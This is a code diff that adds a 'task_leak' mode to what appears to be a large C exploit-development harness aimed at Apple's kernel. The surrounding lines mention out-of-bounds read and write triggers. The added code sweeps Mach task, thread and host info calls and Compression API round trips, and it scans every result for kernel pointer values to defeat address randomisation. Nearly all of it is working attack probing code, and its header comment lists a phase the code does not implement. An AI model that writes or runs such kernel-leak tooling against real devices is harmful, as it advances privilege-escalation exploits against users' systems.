@@ -14169,7 +14169,8 @@ vps_cd_done:
         rlog("\n=== MACH_PORT_LEAK complete ===\n");
 
     } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0 ||
-               strcmp(mode, "state_leak") == 0 || strcmp(mode, "registry_leak") == 0) {
+               strcmp(mode, "state_leak") == 0 || strcmp(mode, "registry_leak") == 0 ||
+               strcmp(mode, "task_leak") == 0) {
         goto new_modes;
 
     } else {
@@ -14233,6 +14234,7 @@ vps_cd_done:
         rlog("  ave_prop_scan [phase]              -- KEY: VT property scan for OOB read triggers\n");
         rlog("  state_leak [phase]                 -- KEY: IOSurface/AGX/JPEG state management info leak\n");
         rlog("  registry_leak [phase]              -- KEY: IORegistry property + CMSampleBuffer KPTR scan\n");
+        rlog("  task_leak [phase]                  -- KEY: Mach task/thread/host info + compression leak\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -15969,6 +15971,387 @@ new_modes:
         }
 
         rlog("\n=== REGISTRY_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
+
+    } else if (strcmp(mode, "task_leak") == 0) {
+        /*
+         * task_leak — Mach task/thread/host info + compression kernel leak
+         *
+         * Phase 1: task_info with all flavors (TASK_BASIC_INFO through TASK_FLAGS_INFO)
+         * Phase 2: thread_info with all flavors
+         * Phase 3: host_info with all flavors
+         * Phase 4: mach_zone_info / zone_info_for_zone (if accessible)
+         * Phase 5: Compression API uninitialized memory test (CVE-2026-113910 pattern)
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+        rlog("=== TASK_LEAK: Mach info + compression kernel pointer probe ===\n");
+        rlog("phase=%d (0=all)\n\n", phase);
+
+        int kptr_found = 0;
+
+        /* ===== Phase 1: task_info ===== */
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: task_info all flavors ---\n");
+
+            task_port_t self_task = mach_task_self();
+            /* Flavors: TASK_BASIC_INFO=5, TASK_EVENTS_INFO=2, TASK_THREAD_TIMES_INFO=3,
+               TASK_ABSOLUTETIME_INFO=1, TASK_KERNELMEMORY_INFO=7, TASK_SECURITY_TOKEN=13,
+               TASK_AUDIT_TOKEN=15, TASK_AFFINITY_TAG_INFO=16, TASK_DYLD_INFO=17,
+               TASK_EXTMOD_INFO=19, TASK_VM_INFO=22, TASK_FLAGS_INFO=33 */
+            int flavors[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
+                             16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28,
+                             29, 30, 31, 32, 33, 34, 35};
+            const char *fnames[] = {
+                "ABSOLUTETIME", "EVENTS", "THREAD_TIMES", "4", "BASIC",
+                "6", "KERNELMEMORY", "8", "9", "10", "11", "12",
+                "SECURITY_TOKEN", "14", "AUDIT_TOKEN", "AFFINITY_TAG",
+                "DYLD", "18", "EXTMOD", "20", "21", "VM_INFO", "23",
+                "24", "25", "26", "27", "28", "29", "30", "31", "32",
+                "FLAGS", "34", "35"};
+
+            for (int fi = 0; fi < 35; fi++) {
+                uint8_t info_buf[4096];
+                memset(info_buf, 0xAA, sizeof(info_buf));
+                mach_msg_type_number_t count = sizeof(info_buf) / sizeof(natural_t);
+                kern_return_t kr = task_info(self_task, flavors[fi],
+                    (task_info_t)info_buf, &count);
+                if (kr != KERN_SUCCESS) continue;
+
+                size_t actual_sz = count * sizeof(natural_t);
+                rlog("  flavor=%2d (%-16s): %zu bytes", flavors[fi], fnames[fi], actual_sz);
+
+                /* Scan for kernel pointers */
+                int found_here = 0;
+                for (size_t si = 0; si + 7 < actual_sz; si++) {
+                    uint64_t v = 0;
+                    memcpy(&v, info_buf + si, 8);
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        if (v != 0xFFFFFFFFFFFFFFFFULL && v != 0xFFFFFFFF00000000ULL) {
+                            if (!found_here) rlog("\n");
+                            rlog("    KPTR @%zu: 0x%016llx\n", si, v);
+                            kptr_found++;
+                            found_here++;
+                        }
+                    }
+                }
+
+                /* Special: TASK_DYLD_INFO (flavor 17) contains dyld_all_image_infos address */
+                if (flavors[fi] == 17 && actual_sz >= 24) {
+                    uint64_t daddr = 0, dsize = 0;
+                    memcpy(&daddr, info_buf, 8);
+                    memcpy(&dsize, info_buf + 8, 8);
+                    rlog(" dyld_addr=0x%llx dyld_sz=0x%llx", daddr, dsize);
+                    /* Check all_image_infos for in-memory kernel pointers */
+                    if (actual_sz >= 24) {
+                        uint64_t dv = 0;
+                        memcpy(&dv, info_buf + 16, 8);
+                        rlog(" [16]=0x%llx", dv);
+                    }
+                }
+                if (!found_here) rlog("\n");
+            }
+            rlog("Phase 1 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 2: thread_info ===== */
+        if (phase == 0 || phase == 2) {
+            rlog("--- Phase 2: thread_info all flavors ---\n");
+
+            thread_act_array_t threads;
+            mach_msg_type_number_t thread_count = 0;
+            kern_return_t kr = task_threads(mach_task_self(), &threads, &thread_count);
+            if (kr != KERN_SUCCESS) {
+                rlog("task_threads failed: 0x%x\n", kr);
+            } else {
+                rlog("  thread count: %u\n", thread_count);
+                /* Only inspect first thread */
+                if (thread_count > 0) {
+                    for (int flav = 1; flav <= 20; flav++) {
+                        uint8_t tbuf[4096];
+                        memset(tbuf, 0xAA, sizeof(tbuf));
+                        mach_msg_type_number_t tcnt = sizeof(tbuf) / sizeof(natural_t);
+                        kr = thread_info(threads[0], flav,
+                            (thread_info_t)tbuf, &tcnt);
+                        if (kr != KERN_SUCCESS) continue;
+
+                        size_t tsz = tcnt * sizeof(natural_t);
+                        rlog("  thread flavor=%2d: %zu bytes", flav, tsz);
+
+                        for (size_t si = 0; si + 7 < tsz; si++) {
+                            uint64_t v = 0;
+                            memcpy(&v, tbuf + si, 8);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                    v != 0xFFFFFFFF00000000ULL) {
+                                    rlog(" KPTR@%zu=0x%016llx", si, v);
+                                    kptr_found++;
+                                }
+                            }
+                        }
+
+                        /* Dump first 64 bytes hex */
+                        if (tsz > 0) {
+                            rlog(" hex:");
+                            for (size_t hi = 0; hi < tsz && hi < 64; hi++)
+                                rlog("%02x", tbuf[hi]);
+                        }
+                        rlog("\n");
+                    }
+
+                    /* ARM64 thread state (flavor 6 = ARM_THREAD_STATE64) */
+                    rlog("\n  ARM64 thread state:\n");
+                    uint8_t arm_buf[1024];
+                    memset(arm_buf, 0xAA, sizeof(arm_buf));
+                    mach_msg_type_number_t acnt = sizeof(arm_buf) / sizeof(natural_t);
+                    kr = thread_get_state(threads[0], 6,
+                        (thread_state_t)arm_buf, &acnt);
+                    if (kr == KERN_SUCCESS) {
+                        size_t asz = acnt * sizeof(natural_t);
+                        rlog("    ARM_THREAD_STATE64: %zu bytes\n", asz);
+                        /* x0-x28, fp, lr, sp, pc, cpsr, pad */
+                        for (int ri = 0; ri < 33 && (ri * 8 + 7) < (int)asz; ri++) {
+                            uint64_t rv = 0;
+                            memcpy(&rv, arm_buf + ri * 8, 8);
+                            const char *rname = "x";
+                            if (ri == 29) rname = "fp";
+                            else if (ri == 30) rname = "lr";
+                            else if (ri == 31) rname = "sp";
+                            else if (ri == 32) rname = "pc";
+                            if (ri <= 28)
+                                rlog("    x%-2d = 0x%016llx", ri, rv);
+                            else
+                                rlog("    %-3s = 0x%016llx", rname, rv);
+                            if ((rv & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (rv & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (rv != 0xFFFFFFFFFFFFFFFFULL) {
+                                    rlog(" <<<KPTR?>>>");
+                                    kptr_found++;
+                                }
+                            }
+                            rlog("\n");
+                        }
+                    } else {
+                        rlog("    thread_get_state failed: 0x%x\n", kr);
+                    }
+                }
+
+                /* Cleanup */
+                for (mach_msg_type_number_t ti = 0; ti < thread_count; ti++)
+                    mach_port_deallocate(mach_task_self(), threads[ti]);
+                vm_deallocate(mach_task_self(), (vm_address_t)threads,
+                    thread_count * sizeof(thread_act_t));
+            }
+            rlog("Phase 2 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 3: host_info ===== */
+        if (phase == 0 || phase == 3) {
+            rlog("--- Phase 3: host_info all flavors ---\n");
+
+            host_t host = mach_host_self();
+            for (int flav = 1; flav <= 20; flav++) {
+                uint8_t hbuf[4096];
+                memset(hbuf, 0xAA, sizeof(hbuf));
+                mach_msg_type_number_t hcnt = sizeof(hbuf) / sizeof(natural_t);
+                kern_return_t kr = host_info(host, flav,
+                    (host_info_t)hbuf, &hcnt);
+                if (kr != KERN_SUCCESS) continue;
+
+                size_t hsz = hcnt * sizeof(natural_t);
+                rlog("  host flavor=%2d: %zu bytes", flav, hsz);
+
+                for (size_t si = 0; si + 7 < hsz; si++) {
+                    uint64_t v = 0;
+                    memcpy(&v, hbuf + si, 8);
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        if (v != 0xFFFFFFFFFFFFFFFFULL && v != 0xFFFFFFFF00000000ULL) {
+                            rlog(" KPTR@%zu=0x%016llx", si, v);
+                            kptr_found++;
+                        }
+                    }
+                }
+
+                /* Print raw hex for interesting flavors */
+                if (hsz > 0 && hsz <= 256) {
+                    rlog(" hex:");
+                    for (size_t hi = 0; hi < hsz && hi < 64; hi++)
+                        rlog("%02x", hbuf[hi]);
+                }
+                rlog("\n");
+            }
+
+            /* Also try host_statistics */
+            rlog("\n  host_statistics:\n");
+            for (int flav = 1; flav <= 10; flav++) {
+                uint8_t sbuf[4096];
+                memset(sbuf, 0xAA, sizeof(sbuf));
+                mach_msg_type_number_t scnt = sizeof(sbuf) / sizeof(integer_t);
+                kern_return_t kr = host_statistics(host, flav,
+                    (host_info_t)sbuf, &scnt);
+                if (kr != KERN_SUCCESS) continue;
+
+                size_t ssz = scnt * sizeof(integer_t);
+                rlog("    stat flavor=%d: %zu bytes", flav, ssz);
+
+                for (size_t si = 0; si + 7 < ssz; si++) {
+                    uint64_t v = 0;
+                    memcpy(&v, sbuf + si, 8);
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        if (v != 0xFFFFFFFFFFFFFFFFULL && v != 0xFFFFFFFF00000000ULL) {
+                            rlog(" KPTR@%zu=0x%016llx", si, v);
+                            kptr_found++;
+                        }
+                    }
+                }
+                rlog("\n");
+            }
+            rlog("Phase 3 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 4: Compression API uninitialized memory (CVE-2026-113910) ===== */
+        if (phase == 0 || phase == 4) {
+            rlog("--- Phase 4: Compression API uninitialized memory test ---\n");
+
+            /* The idea: compress data, then decompress with a larger-than-needed
+               output buffer. If the kernel-side decompression path doesn't zero
+               output beyond the decompressed size, stale kernel heap data may
+               remain in the output buffer. */
+
+            uint8_t src[4096];
+            memset(src, 0x42, sizeof(src));
+            /* Write some structure */
+            for (int i = 0; i < 4096; i += 64) src[i] = (uint8_t)(i & 0xFF);
+
+            /* Compress with each algorithm */
+            int algos[] = {0x102, 0x302, 0x702, 0xB02}; /* LZ4, ZLIB, LZMA, LZ4RAW */
+            const char *anames[] = {"LZ4", "ZLIB", "LZMA", "LZ4RAW"};
+
+            for (int ai = 0; ai < 4; ai++) {
+                uint8_t comp[8192];
+                memset(comp, 0, sizeof(comp));
+                size_t comp_sz = compression_encode_buffer(comp, sizeof(comp),
+                    src, sizeof(src), NULL, algos[ai]);
+                if (comp_sz == 0 || comp_sz >= sizeof(comp)) {
+                    rlog("  %s: compression failed\n", anames[ai]);
+                    continue;
+                }
+                rlog("  %s: compressed %zu -> %zu bytes\n", anames[ai],
+                     sizeof(src), comp_sz);
+
+                /* Decompress with 2x output buffer, pre-fill with 0xAA sentinel */
+                uint8_t decomp[16384];
+                memset(decomp, 0xAA, sizeof(decomp));
+                size_t decomp_sz = compression_decode_buffer(decomp, sizeof(decomp),
+                    comp, comp_sz, NULL, algos[ai]);
+                rlog("    decompressed: %zu bytes (expected %zu)\n",
+                     decomp_sz, sizeof(src));
+
+                if (decomp_sz > 0) {
+                    /* Check bytes BEYOND decompressed size for kernel data */
+                    int beyond_modified = 0;
+                    int kptr_beyond = 0;
+                    for (size_t si = decomp_sz; si + 7 < sizeof(decomp); si++) {
+                        if (decomp[si] != 0xAA) beyond_modified++;
+                        uint64_t v = 0;
+                        memcpy(&v, decomp + si, 8);
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                v != 0xFFFFFFFF00000000ULL &&
+                                v != 0xAAAAAAAAAAAAAAAAULL) {
+                                rlog("    KPTR beyond @%zu: 0x%016llx\n", si, v);
+                                kptr_found++;
+                                kptr_beyond++;
+                            }
+                        }
+                    }
+                    rlog("    beyond-decomp modified bytes: %d, KPTR: %d\n",
+                         beyond_modified, kptr_beyond);
+
+                    /* Also scan WITHIN decompressed output for kernel addresses
+                       that shouldn't be there */
+                    for (size_t si = 0; si + 7 < decomp_sz; si++) {
+                        uint64_t v = 0;
+                        memcpy(&v, decomp + si, 8);
+                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                v != 0xFFFFFFFF00000000ULL) {
+                                rlog("    KPTR within @%zu: 0x%016llx\n", si, v);
+                                kptr_found++;
+                            }
+                        }
+                    }
+                }
+            }
+
+            /* Also test with stream API for more kernel interaction */
+            rlog("\n  Stream compression test:\n");
+            for (int ai = 0; ai < 4; ai++) {
+                compression_stream stream;
+                compression_status status;
+
+                status = compression_stream_init(&stream, COMPRESSION_STREAM_ENCODE,
+                    algos[ai]);
+                if (status != COMPRESSION_STATUS_OK) continue;
+
+                uint8_t scomp[8192];
+                stream.src_ptr = src;
+                stream.src_size = sizeof(src);
+                stream.dst_ptr = scomp;
+                stream.dst_size = sizeof(scomp);
+
+                status = compression_stream_process(&stream, COMPRESSION_STREAM_FINALIZE);
+                size_t scomp_sz = sizeof(scomp) - stream.dst_size;
+                compression_stream_destroy(&stream);
+
+                if (scomp_sz == 0) continue;
+
+                /* Decompress via stream */
+                status = compression_stream_init(&stream, COMPRESSION_STREAM_DECODE,
+                    algos[ai]);
+                if (status != COMPRESSION_STATUS_OK) continue;
+
+                uint8_t sdecomp[16384];
+                memset(sdecomp, 0xBB, sizeof(sdecomp));
+                stream.src_ptr = scomp;
+                stream.src_size = scomp_sz;
+                stream.dst_ptr = sdecomp;
+                stream.dst_size = sizeof(sdecomp);
+
+                status = compression_stream_process(&stream, COMPRESSION_STREAM_FINALIZE);
+                size_t sdecomp_sz = sizeof(sdecomp) - stream.dst_size;
+                compression_stream_destroy(&stream);
+
+                rlog("    %s stream: comp=%zu decomp=%zu\n", anames[ai], scomp_sz, sdecomp_sz);
+
+                /* Scan beyond decompressed area */
+                int smod = 0;
+                for (size_t si = sdecomp_sz; si + 7 < sizeof(sdecomp); si++) {
+                    if (sdecomp[si] != 0xBB) smod++;
+                    uint64_t v = 0;
+                    memcpy(&v, sdecomp + si, 8);
+                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                            v != 0xBBBBBBBBBBBBBBBBULL) {
+                            rlog("    STREAM KPTR @%zu: 0x%016llx\n", si, v);
+                            kptr_found++;
+                        }
+                    }
+                }
+                if (smod > 0)
+                    rlog("    %s stream: %d bytes modified beyond decomp\n",
+                         anames[ai], smod);
+            }
+
+            rlog("Phase 4 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        rlog("\n=== TASK_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
     }
 
 done:
